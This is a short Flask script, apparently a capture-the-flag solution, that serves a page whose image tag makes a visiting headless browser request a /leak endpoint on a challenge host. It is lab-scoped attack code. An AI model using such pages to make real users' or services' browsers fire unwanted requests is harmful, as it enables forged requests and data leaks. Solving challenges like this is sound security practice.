from flask import Flask

app = Flask(__name__)

@app.route("/")
def index():
    # The payload tries to get the headless browser to make a request to the /leak endpoint.
    data = '<html><body><img src="http://challenge.localhost/leak"></body></html>'
    return data

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
